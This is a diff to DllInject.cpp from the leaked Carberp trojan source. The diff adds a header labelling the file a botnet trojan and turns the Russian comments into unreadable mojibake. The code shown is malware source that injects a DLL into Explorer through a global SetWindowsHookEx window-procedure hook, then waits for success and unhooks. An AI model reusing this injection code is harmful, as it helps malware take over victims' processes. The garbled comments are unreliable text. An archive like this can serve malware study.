@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 // DllInject.cpp : Defines the exported functions for the DLL application.
 //
 
@@ -18,10 +29,10 @@ namespace DllIn
 char nameDllInject[MAX_PATH] = { 0 };
 char nameExe[MAX_PATH] = { 0 };
 char runFunc[64] = { 0 };
-int injectGood = 0; // = 2 - внедрение прошло успешно
+int injectGood = 0; // = 2 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 #pragma data_seg()
 #pragma comment(linker, "/section:.shared,RWS")
-HMODULE currHDLL; //запущенная длл, нужна для извлечения пути к ней
+HMODULE currHDLL; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ
 
 void InjectFromHookDll()
 {
@@ -119,16 +130,16 @@ bool EXPORT_API __stdcall InjectIntoExplorerThroughHook(char* exe, char* dll, ch
 	lstrcpy( nameExe, exe );
 	lstrcpy( runFunc, func );
 	injectGood = 0;
-	HHOOK hook = SetWindowsHookEx( WH_CALLWNDPROC, FilterCallWndProc, currHDLL, 0 ); //ставим хук
+	HHOOK hook = SetWindowsHookEx( WH_CALLWNDPROC, FilterCallWndProc, currHDLL, 0 ); //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	if( hook )
 	{
-		//ждем пока внедримся, не больше 10 секунд
+		//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 10 пїЅпїЅпїЅпїЅпїЅпїЅ
 		for( int i = 0; i < 100; i++ )
 		{
 			if( injectGood == 2 ) break;
 			Sleep(100);
 		}
-		UnhookWindowsHookEx(hook); //снимаем хук
+		UnhookWindowsHookEx(hook); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	}
 	return injectGood == 2 ? true : false;;
 }
